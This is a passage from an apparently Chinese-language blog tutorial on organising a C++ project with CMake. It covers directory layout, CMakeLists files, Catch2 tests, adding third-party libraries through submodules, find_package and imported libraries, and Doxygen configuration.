源码依赖的第三方库<br>│   │   └── CMakeLists.txt<br>│   └── target-- 头文件/库依赖的第三方库<br>│       └── catch<br>│           └── catch.hpp<br>├── build-- 本地构建目录<br>│   ├── bin<br>│   │   ├── Debug<br>│   │   └── Release<br>│   ├── docs<br>│   └── lib<br>├── CMakeLists.txt-- 根目录cmake配置<br>├── Doxyfile.in-- Doxygen配置文件<br>├── include-- 公共头文件<br>│   └── netapi<br>│       └── tools<br>│           └── tools.hpp<br>├── README.md-- 说明文档<br>├── src-- 源码目录<br>│   ├── CMakeLists.txt<br>│   ├── main.cpp<br>│   └── tools<br>│       └── tools.cpp<br>└── tests-- 测试源码目录<br>    ├── CMakeLists.txt<br>    └── tools<br>        └── tools.test.cpp<br></code></pre></td></tr></table></figure><ul><li><p>物理组件组织分为分离和合并两种方式，一般作为库时，可以采用分离头文件的方式，但两种方式都要保证相对路径一致。</p></li><li><p>include目录中的项目名是防止在依赖第三方库时的名字冲突。</p></li><li><p>每个组件包含一个独立的命令空间，如gno::shapes::circle，可以从这个命名空间中得到文件的目录信息如下：</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;root&gt;<br>    src/geo/shapes/<br>        circle.cpp<br>    include/&lt;root&gt;/geo/shapes/<br>    circle.hpp<br>    tests/geo/shapes/<br>    circle.test.cpp<br></code></pre></td></tr></table></figure><p>如果每个类的函数实现过于复杂，可以根据函数名进行再次拆分，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">geo::shapes::circle -&gt; circumference()<br>geo::shapes::circle -&gt; area()<br><br>&lt;root&gt;<br>    src/geo/shapes/<br>        circle.hpp<br>        circle.cpp<br>        circle.circumference.cpp<br>        circle.area.cpp<br>        circle.test.cpp<br></code></pre></td></tr></table></figure><h1 id="2-CMakeLists-txt文件"><a href="#2-CMakeLists-txt文件" class="headerlink" title="2.CMakeLists.txt文件"></a>2.CMakeLists.txt文件</h1><h2 id="2-1-根目录"><a href="#2-1-根目录" class="headerlink" title="2.1 根目录"></a>2.1 根目录</h2><p><strong>.&#x2F;CMakeLists.txt</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.16</span>)<br><br><span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD <span class="hljs-number">17</span>)<br><span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD_REQUIRED <span class="hljs-keyword">True</span>)<br><span class="hljs-keyword">set</span>(CMAKE_CXX_EXTENSIONS <span class="hljs-keyword">OFF</span>)<br><br><span class="hljs-keyword">project</span>(netapi LANGUAGES C CXX)<br><br><span class="hljs-comment"># 定义变量</span><br><span class="hljs-keyword">set</span>(PROJECT_INCLUDE_DIR <span class="hljs-string">&quot;$&#123;PROJECT_SOURCE_DIR&#125;/include&quot;</span>)<br><span class="hljs-keyword">set</span>(PROJECT_SRC_DIR <span class="hljs-string">&quot;$&#123;PROJECT_SOURCE_DIR&#125;/src&quot;</span>)<br><span class="hljs-keyword">set</span>(PROJECT_3RD_TARGET_DIR <span class="hljs-string">&quot;$&#123;PROJECT_SOURCE_DIR&#125;/3rdparty/target&quot;</span>)<br><span class="hljs-keyword">set</span>(PROJECT_3RD_EXTERNAL_DIR <span class="hljs-string">&quot;$&#123;PROJECT_SOURCE_DIR&#125;/3rdparty/external&quot;</span>)<br><br><span class="hljs-comment"># 默认构建类型</span><br><span class="hljs-keyword">if</span>(CMAKE_BUILD_TYPE <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">set</span>(CMAKE_BUILD_TYPE <span class="hljs-string">&quot;Release&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><span class="hljs-keyword">message</span>(STATUS <span class="hljs-string">&quot;Current build type is $&#123;CMAKE_BUILD_TYPE&#125;&quot;</span>)<br><br><span class="hljs-comment"># 指定输出目录</span><br><span class="hljs-keyword">set</span>(CMAKE_ARCHIVE_OUTPUT_DIRECTORY <span class="hljs-string">&quot;$&#123;CMAKE_BINARY_DIR&#125;/bin/$&#123;CMAKE_BUILD_TYPE&#125;&quot;</span>)<br><span class="hljs-keyword">set</span>(CMAKE_LIBRARY_OUTPUT_DIRECTORY <span class="hljs-string">&quot;$&#123;CMAKE_BINARY_DIR&#125;/lib/$&#123;CMAKE_BUILD_TYPE&#125;&quot;</span>)<br><span class="hljs-keyword">set</span>(CMAKE_RUNTIME_OUTPUT_DIRECTORY <span class="hljs-string">&quot;$&#123;CMAKE_BINARY_DIR&#125;/bin/$&#123;CMAKE_BUILD_TYPE&#125;&quot;</span>)<br><br><span class="hljs-comment"># 配置Doxygen</span><br><span class="hljs-keyword">find_package</span>(Doxygen)<br><span class="hljs-keyword">if</span> (DOXYGEN_FOUND)<br>    <span class="hljs-keyword">message</span>(STATUS <span class="hljs-string">&quot;Start to build doxygen documentation&quot;</span>)<br>    <span class="hljs-comment"># 配置目录</span><br>    <span class="hljs-keyword">set</span>(DOXYGEN_IN <span class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/Doxyfile.in)<br>    <span class="hljs-comment"># 输出目录</span><br>    <span class="hljs-keyword">set</span>(DOXYGEN_OUT <span class="hljs-variable">$&#123;CMAKE_BINARY_DIR&#125;</span>/Doxyfile)<br>    <span class="hljs-comment"># 配置模板文件</span><br>    <span class="hljs-keyword">configure_file</span>(<span class="hljs-variable">$&#123;DOXYGEN_IN&#125;</span> <span class="hljs-variable">$&#123;DOXYGEN_OUT&#125;</span> @ONLY)<br>    <span class="hljs-comment"># 添加自定义生成命令</span><br>    <span class="hljs-keyword">add_custom_target</span>( docs ALL<br>        <span class="hljs-keyword">COMMAND</span> <span class="hljs-variable">$&#123;DOXYGEN_EXECUTABLE&#125;</span> <span class="hljs-variable">$&#123;DOXYGEN_OUT&#125;</span><br>        WORKING_DIRECTORY <span class="hljs-variable">$&#123;CMAKE_BINARY_DIR&#125;</span><br>        COMMENT <span class="hljs-string">&quot;STATUS Generating API documentation with Doxygen&quot;</span><br>        VERBATIM )<br><span class="hljs-keyword">else</span> (DOXYGEN_FOUND)<br>    <span class="hljs-keyword">message</span>(STATUS <span class="hljs-string">&quot;Dexygen not installed&quot;</span>)<br><span class="hljs-keyword">endif</span> (DOXYGEN_FOUND)<br><br><span class="hljs-comment"># 子目录</span><br><span class="hljs-keyword">add_subdirectory</span>(<span class="hljs-number">3</span>rdparty/external)<br><span class="hljs-keyword">add_subdirectory</span>(src)<br><span class="hljs-keyword">add_subdirectory</span>(tests)<br></code></pre></td></tr></table></figure><h2 id="2-2-外部依赖目录"><a href="#2-2-外部依赖目录" class="headerlink" title="2.2 外部依赖目录"></a>2.2 外部依赖目录</h2><p><strong>external&#x2F;CMakeLists.txt</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">add_subdirectory</span>(spdlog)<br></code></pre></td></tr></table></figure><h2 id="2-3-源文件目录"><a href="#2-3-源文件目录" class="headerlink" title="2.3 源文件目录"></a>2.3 源文件目录</h2><p><strong>src&#x2F;CMakeLists.txt</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># tools库</span><br><span class="hljs-keyword">add_library</span>(tools OBJECT <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">file</span>(GLOB_RECURSE tools_sources CONFIGURE_DEPENDS <span class="hljs-string">&quot;$&#123;PROJECT_SRC_DIR&#125;/tools/*.cpp&quot;</span> <span class="hljs-string">&quot;$&#123;PROJECT_INCLUDE_DIR&#125;/netapi/tools/*.hpp&quot;</span>)<br><span class="hljs-keyword">target_sources</span>(tools PRIVATE <span class="hljs-string">&quot;$&#123;tools_sources&#125;&quot;</span>)<br><span class="hljs-keyword">target_include_directories</span>(tools PUBLIC <span class="hljs-string">&quot;$&#123;PROJECT_INCLUDE_DIR&#125;&quot;</span>)<br><br><span class="hljs-comment"># spdlog库</span><br><span class="hljs-keyword">target_include_directories</span>(tools PUBLIC <span class="hljs-string">&quot;$&#123;PROJECT_3RD_EXTERNAL_DIR&#125;/spdlog/include&quot;</span>)<br><span class="hljs-keyword">target_link_libraries</span>(tools PRIVATE spdlog::spdlog)<br><br><span class="hljs-comment"># main函数</span><br><span class="hljs-keyword">add_executable</span>(netapi main.cpp)<br><span class="hljs-keyword">target_link_libraries</span>(netapi PUBLIC tools)<br><span class="hljs-keyword">target_include_directories</span>(netapi PUBLIC <span class="hljs-string">&quot;$&#123;PROJECT_INCLUDE_DIR&#125;&quot;</span>)<br><br><span class="hljs-comment"># 自定义运行命令</span><br><span class="hljs-keyword">add_custom_target</span>(run <span class="hljs-keyword">COMMAND</span> <span class="hljs-string">&quot;$&lt;TARGET_FILE:netapi&gt;&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="2-4-测试目录"><a href="#2-4-测试目录" class="headerlink" title="2.4 测试目录"></a>2.4 测试目录</h2><p><strong>tests&#x2F;CMakeLists.txt</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">enable_testing</span>()<br><br><span class="hljs-keyword">add_executable</span>(<br>    unit_tests<br>    tools/tools.<span class="hljs-keyword">test</span>.cpp<br>)<br><span class="hljs-comment"># 引入catch2头文件库</span><br><span class="hljs-keyword">target_include_directories</span>(unit_tests PUBLIC <span class="hljs-string">&quot;$&#123;PROJECT_3RD_TARGET_DIR&#125;&quot;</span>)<br><br><span class="hljs-comment"># 引入待测试的函数</span><br><span class="hljs-keyword">target_include_directories</span>(unit_tests PUBLIC <span class="hljs-string">&quot;$&#123;PROJECT_INCLUDE_DIR&#125;&quot;</span>)<br><span class="hljs-keyword">target_link_libraries</span>(unit_tests PRIVATE tools)<br><br><span class="hljs-keyword">add_test</span>(test_all unit_tests)<br><br><span class="hljs-comment"># 自定义测试命令</span><br><span class="hljs-keyword">add_custom_target</span>(<span class="hljs-keyword">test</span> <span class="hljs-keyword">COMMAND</span> <span class="hljs-string">&quot;$&lt;TARGET_FILE:unit_tests&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="3-catch2测试库"><a href="#3-catch2测试库" class="headerlink" title="3.catch2测试库"></a>3.catch2测试库</h1><p><strong>基础框架</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CATCH_CONFIG_MAIN</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;catch/catch.hpp&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netapi/tools/tools.hpp&gt;</span></span><br><br><span class="hljs-built_in">TEST_CASE</span>(<span class="hljs-string">&quot;simple1&quot;</span>) &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-built_in">calc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">REQUIRE</span>(res == <span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_CASE</span>(<span class="hljs-string">&quot;simple2&quot;</span>) &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-built_in">calc</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">REQUIRE</span>(res == <span class="hljs-number">7</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-测试与运行"><a href="#4-测试与运行" class="headerlink" title="4.测试与运行"></a>4.测试与运行</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># 配置为发布版</span><br>cmake -B build -DCMAKE_BUILD_TYPE=Release<br><span class="hljs-comment"># 生成bin</span><br>cmake --build build --parallel <span class="hljs-number">4</span><br><span class="hljs-comment"># 运行程序</span><br>cmake --build build --<span class="hljs-keyword">target</span> run<br><span class="hljs-comment"># 执行测试用例</span><br>cmake --build build --<span class="hljs-keyword">target</span> <span class="hljs-keyword">test</span><br><span class="hljs-comment"># 生成API文档</span><br>cmake --build build --<span class="hljs-keyword">target</span> docs<br></code></pre></td></tr></table></figure><h1 id="5-常用命令"><a href="#5-常用命令" class="headerlink" title="5.常用命令"></a>5.常用命令</h1><ul><li>add_executable：添加可执行文件</li><li>add_library：生成库文件，可选参数（动态库SHARED、静态库STATIC、临时对象OBJECT），ALIAS可以为库取别名</li><li>target_include_directories：为目标添加头文件路径，使&lt;&gt;可以找到，其中的作用域修饰符控制被链接后是否对链接者可见</li><li>target_link_libraries：为目标添加库路径</li><li>add_subdirectory：添加子目录，会依次执行子目录的CMakeLists，并且变量可以向子目录传递</li></ul><h1 id="6-导入三方库"><a href="#6-导入三方库" class="headerlink" title="6.导入三方库"></a>6.导入三方库</h1><h2 id="6-1-源码依赖"><a href="#6-1-源码依赖" class="headerlink" title="6.1 源码依赖"></a>6.1 源码依赖</h2><p>可以使用git拉取源码到指定目录作为git仓库的子模块，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git init<br>git submodule add -b &lt;分支&gt; &lt;url.git&gt; &lt;path&gt;<br>eg: git submodule add -b v1.x https://github.com/gabime/spdlog.git 3rdparty/external/spdlog<br></code></pre></td></tr></table></figure><p>如果三方库存在自己的CMakeLists.txt则只需在3rdparty&#x2F;external的CMakeLists.txt中添加子目录，如下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">add_subdirectory</span>(spdlog)<br></code></pre></td></tr></table></figure><p>之后使用target_include_directories和target_link_libraries即可使用，如下。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">target_include_directories</span>(tools PUBLIC <span class="hljs-string">&quot;$&#123;PROJECT_3RD_EXTERNAL_DIR&#125;/spdlog/include&quot;</span>)<br><span class="hljs-keyword">target_link_libraries</span>(tools PRIVATE spdlog::spdlog)<br></code></pre></td></tr></table></figure><h2 id="6-2-find-package"><a href="#6-2-find-package" class="headerlink" title="6.2 find_package"></a>6.2 find_package</h2><p>从系统默认目录中搜索库的包配置文件OpenCVConfig.cmake（或OpenCV-config.cmake），如果找到了则变量XXX_INCLUDE_DIR和XXX_LIBRARIES分别被赋值为库的头文件和库文件路径</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">find_package</span>(OpenCV)<br><span class="hljs-comment"># 查找名为OpenCV的包，找不到不会报错，事后通过$&#123;OpenCV_FOUND&#125;变量来判断是否找到</span><br><span class="hljs-keyword">find_package</span>(OpenCV REQUIRED)<br><span class="hljs-comment"># 找不到会报错，并终止cmake</span><br><span class="hljs-keyword">find_package</span>(OpenCV REQUIRED COMPONENTS core videoio)<br><span class="hljs-comment"># OpenCV的包里面必须得有OpenCV::core和OpenCV::videoio这两个组件，否则也报错</span><br><span class="hljs-keyword">find_package</span>(OpenCV REQUIRED OPTIONAL_COMPONENTS core videoio)<br><span class="hljs-comment"># 组件找不到不会报错，可以通过$&#123;OpenCV_core_FOUND&#125;变量判断是否找到</span><br><br><span class="hljs-comment"># 检查是否找到，大多数库找到的话都会设置这个变量</span><br><span class="hljs-keyword">if</span>(OpenCV_FOUND)<br>    <span class="hljs-keyword">message</span> (<span class="hljs-string">&quot;OpenCV found&quot;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span> (FATAL_ERROR <span class="hljs-string">&quot;Cannot find OpenCV&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br><span class="hljs-comment"># 添加可执行文件</span><br><span class="hljs-keyword">add_executable</span>(third_party_include main.cpp)<br><br><span class="hljs-comment"># 指定包含路径</span><br><span class="hljs-keyword">target_include_directories</span>( third_party_include<br>     PRIVATE <span class="hljs-variable">$&#123;OpenCV_INCLUDE_DIR&#125;</span><br> )<br><br><span class="hljs-comment"># 指定库路径</span><br><span class="hljs-keyword">target_link_libraries</span>( third_party_include<br>    PRIVATE<br>    <span class="hljs-variable">$&#123;OpenCV_SYSTEM_LIBRARY&#125;</span><br>    <span class="hljs-variable">$&#123;OpenCV_FILESYSTEM_LIBRARY&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>如果库没有被安装在标准目录下，可以采用手动设置变量或设置环境变量值的形式指出正确路径，如下所示：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(OpenCV_DIR <span class="hljs-string">&quot;D:/OpenCV&quot;</span>)<br></code></pre></td></tr></table></figure><p>这种方式适合作者提供配置文件并且已经提前安装到操作系统中的库。</p><h2 id="6-3-引入已编译的库"><a href="#6-3-引入已编译的库" class="headerlink" title="6.3 引入已编译的库"></a>6.3 引入已编译的库</h2><p>静态库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">add_library</span>(MyLib STATIC IMPORTED)<br><span class="hljs-keyword">set_target_properties</span>(MyLib PROPERTIES<br>IMPORTED_LOCATION_RELEASE <span class="hljs-variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/libMyLibRe.a<br>IMPORTED_LOCATION_DEBUG <span class="hljs-variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/libMyLibDe.a)<br></code></pre></td></tr></table></figure><p>带有依赖项的静态库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">add_library</span>(MyLib2 STATIC IMPORTED)<br><span class="hljs-keyword">set_target_properties</span>(MyLib2 PROPERTIES<br>IMPORTED_LOCATION_RELEASE <span class="hljs-variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/libMyLib2Re.a<br>IMPORTED_LOCATION_DEBUG <span class="hljs-variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/libMyLib2De.a<br>IMPORTED_LINK_INTERFACE_LIBRARIES MyLib) <span class="hljs-comment"># &lt;-- dependency is here</span><br></code></pre></td></tr></table></figure><p>动态库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">add_library</span>(MyLib SHARED IMPORTED)<br><span class="hljs-keyword">set_property</span>(<span class="hljs-keyword">TARGET</span> MyLib PROPERTY IMPORTED_LOCATION c:/path/to/MyLib.dll)<br><span class="hljs-keyword">set_property</span>(<span class="hljs-keyword">TARGET</span> MyLib PROPERTY IMPORTED_IMPLIB c:/path/to/MyLib.lib) <span class="hljs-comment"># 多了lib信息</span><br><span class="hljs-keyword">add_executable</span>(myexe src1.c src2.c)<br><span class="hljs-keyword">target_link_libraries</span>(myexe MyLib)<br></code></pre></td></tr></table></figure><h1 id="7-Doxygen注释"><a href="#7-Doxygen注释" class="headerlink" title="7.Doxygen注释"></a>7.Doxygen注释</h1><h2 id="7-1-配置文件"><a href="#7-1-配置文件" class="headerlink" title="7.1 配置文件"></a>7.1 配置文件</h2><p><strong>doxygen -g</strong>命令生成默认Doxyfile</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 项目名称，将作为于所生成的程序文档首页标题</span><br><span class="hljs-attr">PROJECT_NAME</span>            = <span class="hljs-string">&quot;JNZ test project&quot;</span><br><span class="hljs-comment"># 文档版本号，可对应于项目版本号，譬如 svn、cvs 所生成的项目版本号</span><br><span class="hljs-attr">PROJECT_NUMBER</span>          = <span class="hljs-string">&quot;1.0.0&quot;</span><br><span class="hljs-attr">PROJECT_BRIEF</span>           = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-comment"># 程序文档输出目录</span><br><span class="hljs-attr">OUTPUT_DIRECTORY</span>        = docs<br> <br><span class="hljs-comment"># 程序文档输入目录 </span><br><span class="hljs-attr">INPUT</span>                   = @PROJECT_SOURCE_DIR@/src    \<br>                          @PROJECT_SOURCE_DIR@/include<br> <br><span class="hljs-comment"># 程序文档语言环境</span><br><span class="hljs-attr">OUTPUT_LANGUAGE</span>         = Chinese<br><span class="hljs-attr">DOXYFILE_ENCODING</span>       = UTF-<span class="hljs-number">8</span><br><span class="hljs-comment"># 只对头文件中的文档化信息生成程序文档 </span><br><span class="hljs-attr">FILE_PATTERNS</span>           = *.hpp *.cpp<br> <br><span class="hljs-comment"># 递归遍历当前目录的子目录，寻找被文档化的程序源文件 </span><br><span class="hljs-attr">RECURSIVE</span>               = <span class="hljs-literal">YES</span> <br><span class="hljs-comment"># 如果是制作 C 程序文档，该选项必须设为 YES，否则默认生成 C++ 文档格式</span><br><span class="hljs-attr">OPTIMIZE_OUTPUT_FOR_C</span>   = <span class="hljs-literal">NO</span><br> <br><span class="hljs-comment">#提取信息，包含类的私有数据成员和静态成员</span><br><span class="hljs-attr">EXTRACT_ALL</span>             = <span class="hljs-literal">yes</span><br><span class="hljs-attr">EXTRACT_PRIVATE</span>         = <span class="hljs-literal">yes</span><br><span class="hljs-attr">EXTRACT_STATIC</span>          = <span class="hljs-literal">yes</span><br><span class="hljs-comment"># 对于使用 typedef 定义的结构体、枚举、联合等数据类型，只按照 typedef 定义的类型名进行文档化</span><br><span class="hljs-attr">TYPEDEF_HIDES_STRUCT</span>    = <span class="hljs-literal">YES</span><br><span class="hljs-comment"># 在 C++ 程序文档中，该值可以设置为 NO，而在 C 程序文档中，由于 C 语言没有所谓的域/名字空间这样的概念，所以此处设置为 YES</span><br><span class="hljs-attr">HIDE_SCOPE_NAMES</span>        = <span class="hljs-literal">YES</span><br><span class="hljs-comment"># 让 doxygen 静悄悄地为你生成文档，只有出现警告或错误时，才在终端输出提示信息</span><br><span class="hljs-attr">QUIET</span>                   = <span class="hljs-literal">YES</span><br><span class="hljs-comment"># 递归遍历示例程序目录的子目录，寻找被文档化的程序源文件</span><br><span class="hljs-attr">EXAMPLE_RECURSIVE</span>       = <span class="hljs-literal">YES</span><br><span class="hljs-comment"># 允许程序文档中显示本文档化的函数相互调用关系</span><br><span class="hljs-attr">REFERENCED_BY_RELATION</span>  = <span class="hljs-literal">YES</span><br><span class="hljs-attr">REFERENCES_RELATION</span>     = <span class="hljs-literal">YES</span><br><span class="hljs-attr">REFERENCES_LINK_SOURCE</span>  = <span class="hljs-literal">YES</span><br><span class="hljs-comment"># 不生成 latex 格式的程序文档</span><br><span class="hljs-attr">GENERATE_LATEX</span>          = <span class="hljs-literal">NO</span><br><span class="hljs-comment"># 在程序文档中允许以图例形式显示函数调用关系，前提是你已经安装了 graphviz 软件包</span><br><span class="hljs-attr">HAVE_DOT</span>                = <span class="hljs-literal">YES</span><br><span class="hljs-attr">CALL_GRAPH</span>              = <span class="hljs-literal">YES</span><br><span class="hljs-attr">CALLER_GRAPH</span>            = <span class="hljs-literal">YES</span><br><span class="hljs-comment">#在最后生成的文档中，把所有的源代码包含在其中</span><br><span class="hljs-attr">SOURCE_BROWSER</span>          = <span class="hljs-literal">YES</span><br><span class="hljs-comment">#这会在HTML文档中，添加一个侧边栏，并以树状结构显示包、类、接口等的关系</span><br><span class="hljs-attr">GENERATE_HTML</span>           = <span class="hljs-literal">YES</span><br></code></pre></td></tr></table></figure><h2 id="7-2-注释语法"><a href="#7-2-注释语法" class="headerlink" title="7.2 注释语法"></a>7.2 注释语法</h2><h3 id="7-2-1-注释格式"><a href="#7-2-1-注释格式" class="headerlink" title="7.2.1 注释格式"></a>7.2.1 注释格式</h3><p>块注释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* ......</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>行注释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">/// ......</span><br><span class="hljs-comment">//* ...... */</span><br></code></pre></td></tr></table></figure><h3 id="7-2-2-常用注释命令"><a href="#7-2-2-常用注释命令" class="headerlink" title="7.2.2 常用注释命令"></a>7.2.2 